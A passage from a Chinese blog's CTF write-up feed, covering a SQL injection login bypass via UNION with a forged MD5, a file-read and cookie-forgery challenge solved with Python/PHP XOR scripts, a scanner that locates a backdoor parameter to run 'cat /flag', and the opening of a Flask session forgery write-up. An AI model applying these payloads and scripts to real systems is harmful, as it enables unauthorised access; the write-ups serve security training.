class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span></span><br></pre></td></tr></table></figure><p>base32解码后得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>base64解码后得到</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username = <span class="string">'$name'</span></span><br></pre></td></tr></table></figure><p>sqlmap测试后可以得到admin的密码MD5值，找不到原码</p><p>于是参考MD5绕过，参考：<a href="https://www.gem-love.com/websecurity/453.html" target="_blank" rel="noopener">简析GXY_CTF “BabySqli v1.0″绕过md5比较</a></p><p>利用以下注入语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name: admin' And 1&gt;2 union select '1','admin','c4ca4238a0b923820dcc509a6f75849b</span><br><span class="line">pw: 1</span><br></pre></td></tr></table></figure><blockquote><p>注：</p><blockquote><ul><li>根据得到的sql后台查询语句，需要用单引号闭合，故最后不用加单引号</li><li>union select后的查询当字符串使用需要加单引号，当然数字可以不加单引号</li><li>过滤了and可以用大写And绕过</li><li>1 的MD5值为c4ca4238a0b923820dcc509a6f75849b</li></ul></blockquote></blockquote><p>于是当前面的语句And 1&gt;2永不成立，联合查询后面的语句就会在数据库中查询显示出来</p><img src="https://i.loli.net/2020/03/27/XHqfk2AmYUGvNyr.png" alt="image-20200202205408575" style="zoom:67%;" /><p>于是这时输入password=1即可绕过查询得到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>其它</title>
      <link href="/2020/03/22/%E5%85%B6%E5%AE%83/"/>
      <url>/2020/03/22/%E5%85%B6%E5%AE%83/</url>
      
        <content type="html"><![CDATA[<h2 id="百度杯九月场Code"><a href="#百度杯九月场Code" class="headerlink" title="百度杯九月场Code"></a>百度杯九月场Code</h2><p>界面：</p><p><img src="https://i.loli.net/2020/03/26/L6dOWMnJXirt9bk.png" alt="image-20200219214921326.png"></p><p>url：<code>http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/index.php?jpg=hei.jpg</code>，查看源码：</p><p><img src="https://i.loli.net/2020/03/26/9N3A46Xmk2jKRBp.png" alt="image-20200219215138731.png"></p><p>猜测存在文件包含读取文件操作，于是访问<code>http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/index.php?jpg=index.php</code>查看源码：</p><p><img src="https://i.loli.net/2020/03/26/5Holtq4dVfOJSn9.png" alt="image-20200219215307566.png"></p><p>base64解密后得到index.php的源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * Date: 2015/11/16</span></span><br><span class="line"><span class="comment"> * Time: 1:31</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>]))</span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?jpg=hei.jpg'</span>);</span><br><span class="line">$file = $_GET[<span class="string">'jpg'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;file:'</span>.$file.<span class="string">'&lt;/title&gt;'</span>;</span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span><br><span class="line">$file = str_replace(<span class="string">"config"</span>,<span class="string">"_"</span>, $file);</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意注释里的这话句<code>Created by PhpStorm</code>，是用<code>PhpStorm</code>编辑器写的，用这个编辑器写的工程文件下会有一个<code>.idea</code>文件夹，<a href="https://segmentfault.com/q/1010000008644646" target="_blank" rel="noopener">详</a>，类似于这个项目的根目录文件，里面包含了一些xml文件（配置）。</p><p>于是访问<code>http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/.idea/workspace.xml</code>得到一个xml页面，提取其中有用信息</p><p><img src="https://i.loli.net/2020/03/26/73OdTw1zpvl6jqb.png" alt="image-20200219220208401.png"></p><p>结合<code>index.php</code>的源码利用<code>config</code>代替<code>_</code>，于是访问<code>http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/index.php?jpg=fl3gconfigichuqiu.php</code>得到<code>fl3g_ichuqiu.php</code>的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * Date: 2015/11/16</span></span><br><span class="line"><span class="comment"> * Time: 1:31</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span><span class="params">($length, $chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz'</span>)</span> </span>&#123;</span><br><span class="line">    $hash = <span class="string">''</span>;</span><br><span class="line">    $max = strlen($chars) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++)&#123;</span><br><span class="line">        $hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $hash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($txt,$key)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">        $tmp .= chr(ord($txt[$i])+<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $txt = $tmp;</span><br><span class="line">    $rnd=random(<span class="number">4</span>);</span><br><span class="line">    $key=md5($rnd.$key);</span><br><span class="line">    $s=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>($s == <span class="number">32</span>) $s = <span class="number">0</span>;</span><br><span class="line">        $ttmp .= $txt[$i] ^ $key[++$s];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($rnd.$ttmp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">($txt,$key)</span></span>&#123;</span><br><span class="line">    $txt=base64_decode($txt);</span><br><span class="line">    $rnd = substr($txt,<span class="number">0</span>,<span class="number">4</span>);</span><br><span class="line">    $txt = substr($txt,<span class="number">4</span>);</span><br><span class="line">    $key=md5($rnd.$key);</span><br><span class="line"></span><br><span class="line">    $s=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>($s == <span class="number">32</span>) $s = <span class="number">0</span>;</span><br><span class="line">        $tmp .= $txt[$i]^$key[++$s];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($tmp);$i++)&#123;</span><br><span class="line">        $tmp1 .= chr(ord($tmp[$i])<span class="number">-10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $tmp1;</span><br><span class="line">&#125;</span><br><span class="line">$username = decrypt($_COOKIE[<span class="string">'user'</span>],$key);</span><br><span class="line"><span class="keyword">if</span> ($username == <span class="string">'system'</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    setcookie(<span class="string">'user'</span>,encrypt(<span class="string">'guest'</span>,$key));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"╮(╯▽╰)╭"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现分别有一个加密函数，一个解密函数，分析php代码；</p><p>当传入<code>cookie</code>中的<code>user</code>的值经过<code>decrypt</code>函数后返回的值为<code>system</code>，就可以得到flag，所以我们需要得到一串base64码，这一串base64经过<code>decrypt</code>函数能解出<code>system</code>，于是</p><p>由<code>guest</code>可以逆推出<code>rnd</code>的值和md5加密后<code>key</code>值的前5位；</p><p>再由<code>key</code>的前5位得出所有前6位可能的值，再通过<code>decrypt</code>函数逆推出函数中<code>$txt</code>值的后6位，再在前面加上<code>$rnd</code>的值经过base64加密后得到的16个可能的<code>user</code>值，再拿16个值去bp进行爆破，即可得到flag</p><p>写出解密脚本，得到<code>rnd</code>和md5加密后的<code>key</code>值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">session = <span class="string">'OFZhSEdLVxga'</span><span class="comment">#本地user值</span></span><br><span class="line">txt = base64.b64decode(session.encode()).decode()</span><br><span class="line">rnd = txt[<span class="number">0</span>:<span class="number">4</span>]   <span class="comment">#拿到rnd的值</span></span><br><span class="line">ttemp = txt[<span class="number">4</span>:]</span><br><span class="line">guest = <span class="string">'guest'</span></span><br><span class="line">tmp = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(guest)):</span><br><span class="line">    tmp += chr(ord(guest[i]) + <span class="number">10</span>)</span><br><span class="line">key = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ttemp)):</span><br><span class="line">    key += chr(ord(tmp[i]) ^ ord(ttemp[i]))<span class="comment">#拿到key</span></span><br><span class="line">system = <span class="string">'system'</span></span><br><span class="line">system1 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(system)):</span><br><span class="line">    system1 += chr(ord(system[i]) + <span class="number">10</span>)</span><br><span class="line">md5 = <span class="string">'0123456789abcdef'</span><span class="comment">#经过md5加密后的每一位数都是0-f之间的数</span></span><br><span class="line">key_new = <span class="string">''</span></span><br><span class="line">cookie_new = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(md5)): <span class="comment">#循环出所有可能的结果</span></span><br><span class="line">    key_new  = key + md5[i]</span><br><span class="line">    session_new = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(system1)):</span><br><span class="line">        session_new += chr(ord(key_new[j]) ^ ord(system1[j]))</span><br><span class="line">    session_new = rnd + session_new</span><br><span class="line">    cookie_new = base64.b64encode(session_new.encode()).decode()</span><br><span class="line">    print(cookie_new)</span><br></pre></td></tr></table></figure><p>运行脚本得到16个base64加密后的值</p><p>按理说原题利用bp是可以爆破的出来的，但是这个题目不知道是环境的问题还是什么原因，后端的user值一直在变，意思是说<code>rnd</code>值一直在变，那md5加密后的<code>key</code>值也会变，脚本就毫无意义，所以无果，还是我哪里理解错了。。。。。先放这里，等我啥时候想明白了，或者哪位大佬告诉我原因了再补上。</p><p>我来填坑了，上面一步我还是理解错了，刷新界面就算会再次执行php脚本，但也会在比较完<code>$username</code>的值后再进入else函数再执行一遍<code>encrypt</code>函数回显一个新的<code>cookie</code>，所以不用考虑<code>user</code>的值会变的问题，因为在他变之前如果我们已经判断出<code>$username</code>==<code>system</code>了，就会成功拿到flag，而后台不会再调用<code>encrypt</code>函数生成新的<code>user</code>，所以这里是没有问题的，但是爆破的时候还是爆破不出来，为什么呢？我可是怀疑我的python脚本</p><p>在网上找个php脚本来执行一下看看二者得出来的base64有什么区别</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $txt1 = <span class="string">'guest'</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($txt1); $i++) &#123;</span><br><span class="line">        $txt1[$i] = chr(ord($txt1[$i])+<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $cookie_guest = <span class="string">'emVTQkZHCh8d'</span>; </span><br><span class="line">    $cookie_guest = base64_decode($cookie_guest);</span><br><span class="line">    $rnd = substr($cookie_guest,<span class="number">0</span>,<span class="number">4</span>); </span><br><span class="line">    $ttmp = substr($cookie_guest,<span class="number">4</span>);</span><br><span class="line">    $key=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($txt1); $i++) &#123;</span><br><span class="line">        $key .= ($txt1[$i] ^ $ttmp[$i]);<span class="comment">//$key=md5($rnd.$key);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $txt2 = <span class="string">'system'</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($txt2); $i++) &#123;</span><br><span class="line">        $txt2[$i] = chr(ord($txt2[$i])+<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $md5 = <span class="string">'0123456789abcdef'</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($md5); $i++) &#123;</span><br><span class="line">        $key_new = $key.$md5[$i];</span><br><span class="line">        $cookie_system=<span class="string">''</span>;</span><br><span class="line">        <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; strlen($txt2); $j++) &#123;</span><br><span class="line">            $cookie_system .= ($key_new[$j] ^ $txt2[$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        $cookie_system = base64_encode($rnd.$cookie_system);</span><br><span class="line">        <span class="keyword">echo</span> $cookie_system.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/26/tBZ9ouP8iFJQCTs.png" alt="image-20200220160920767.png"></p><p>发现预期结果和我想的并不一样，但是结果却有几分相似，逐步排查后发现到最后一步我得到的key的6位值和php上的是一样的，但结果经过base64编码后就不一样了，应该是编码的问题，在网上查了一番后发现python3默认把脚本文件用<code>utf-8</code>进行编码，python2用的是<code>ascii</code>（我用的是python3，python2不会出现这种情况），而php对base64编码的函数是好像用的ascii进行编码（应该~，后文验证），于是改用脚本base64编码方式，这里使用<code>Latin1</code>进行编码，<strong>Latin1编码是单字节编码，向下兼容ASCII，</strong>其编码范围是0x00-0xFF，0x00-0x7F之间完全和ASCII一致，0x80-0x9F之间是控制字符，0xA0-0xFF之间是文字符号，<a href="https://blog.csdn.net/BLGT_57/article/details/80848492" target="_blank" rel="noopener">详</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">session = <span class="string">'QlRxaRVPCx5K'</span></span><br><span class="line">txt = str(base64.b64decode(session),<span class="string">"Latin1"</span>)</span><br><span class="line">rnd = txt[<span class="number">0</span>:<span class="number">4</span>]   <span class="comment">#拿到rnd的值</span></span><br><span class="line">ttemp = txt[<span class="number">4</span>:]</span><br><span class="line">guest = <span class="string">'guest'</span></span><br><span class="line">tmp = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(guest)):</span><br><span class="line">    tmp += chr(ord(guest[i]) + <span class="number">10</span>)</span><br><span class="line">key = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ttemp)):</span><br><span class="line">    key += chr(ord(tmp[i]) ^ ord(ttemp[i]))<span class="comment">#拿到key</span></span><br><span class="line">system = <span class="string">'system'</span></span><br><span class="line">system1 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(system)):</span><br><span class="line">    system1 += chr(ord(system[i]) + <span class="number">10</span>)</span><br><span class="line">md5 = <span class="string">'0123456789abcdef'</span></span><br><span class="line">key_new = <span class="string">''</span></span><br><span class="line">cookie_new = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(md5)):</span><br><span class="line">    key_new  = key + md5[i]</span><br><span class="line">    session_new = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(system1)):</span><br><span class="line">        session_new += chr(ord(key_new[j]) ^ ord(system1[j]))</span><br><span class="line">    session_new = rnd + session_new</span><br><span class="line">    cookie_new = str(base64.b64encode(session_new.encode(<span class="string">'Latin1'</span>)),<span class="string">'Latin1'</span>)</span><br><span class="line">    print(cookie_new)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/26/EwgbXFlpsVe4cYr.png" alt="image-20200220162317195.png"></p><p>于是得到的值和php编码出来的完全一致，然后拿到bp中进行爆破拿到flag</p><p><img src="https://i.loli.net/2020/03/26/X2dqYUFaf4uNP9r.png" alt="image-20200220162440443.png"></p><p>写脚本的水平实在是太菜了，还得多练才行</p><h2 id="2019强网杯—高明的黑客"><a href="#2019强网杯—高明的黑客" class="headerlink" title="2019强网杯—高明的黑客"></a>2019强网杯—高明的黑客</h2><p>核心————————–python脚本</p><p>界面：</p><p><img src="https://i.loli.net/2020/03/26/vKcNfgFOUbpPswa.png" alt="image-190-1580476502993.png"></p><p>将源码下载下来解压后发现有3000多个php文件，于是上大佬脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">print(<span class="string">'开始时间：  '</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)  <span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r"C:/Users/71071/Desktop/src/"</span></span><br><span class="line">os.chdir(filePath)    <span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span><span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span><span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span><span class="params">(file)</span>:</span></span><br><span class="line">    s1.acquire()</span><br><span class="line">    print(<span class="string">'trying   '</span>+file+ <span class="string">'     '</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    <span class="keyword">with</span> open(file,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:    <span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">            gets = list(re.findall(<span class="string">'\$_GET\[\'(.*?)\'\]'</span>, f.read()))</span><br><span class="line">            posts = list(re.findall(<span class="string">'\$_POST\[\'(.*?)\'\]'</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;<span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;<span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">"echo 'xxxxxx';"</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">"echo 'xxxxxx';"</span></span><br><span class="line">    url = <span class="string">'http://1d941413-1227-4486-890d-581a1eda8638.node3.buuoj.cn/'</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)<span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">'utf-8'</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"xxxxxx"</span> <span class="keyword">in</span> content:<span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">'?%s='</span>%a+<span class="string">"echo 'xxxxxx';"</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"xxxxxx"</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">"echo 'xxxxxx';"</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">"xxxxxx"</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:                   <span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        print(<span class="string">'找到了利用文件： '</span>+file+<span class="string">"  and 找到了利用的参数：%s"</span> %param)</span><br><span class="line">        print(<span class="string">'结束时间：  '</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:<span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/26/E52JRo1d7UTzSqu.png" alt="image-191.png"></p><p>访问xk0SzyKwfzw.php?Efa5BVG=cat /flag即可得到flag</p><p><img src="https://i.loli.net/2020/03/26/qjkUgWRPOIuAhfT.png" alt="image-192.png"></p><h2 id="2018HCTF—admin"><a href="#2018HCTF—admin" class="headerlink" title="2018HCTF—admin"></a>2018HCTF—admin</h2><p>核心------------------------ ①flask session 伪造 ；②unicode欺骗 ，<a href="https://www.codercto.com/a/38179.html" target="_blank" rel="noopener">参考</a></p><p>界面：</p><p><img src="https://i.loli.net/2020/03/26/KmtGuqCVU7DwXS1.png" alt="image-183.png"></p><h3 id="Flask-session-伪造"><a href="#Flask-session-伪造" class="headerlink" title="Flask session 伪造"></a>Flask session 伪造</h3><p>参考文章：</p><ul><li><a href="https://xz.aliyun.com/t/3569" target="_blank" rel="noopener">Python Web之flask session&amp;格式化字符串漏洞</a></li><li><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html#" target="_blank" rel="noopener">客户端 session 导致的安全问题</a></li></ul><p>在index和change界面的源码处分别有两处提示：</p><p><img src="https://i.loli.net/2020/03/26/kz51oVFHheciBpM.png" alt="image-184.png"></p><p><img src="https://i.loli.net/2020/03/26/8luTwzCHjGaJxWI.png" 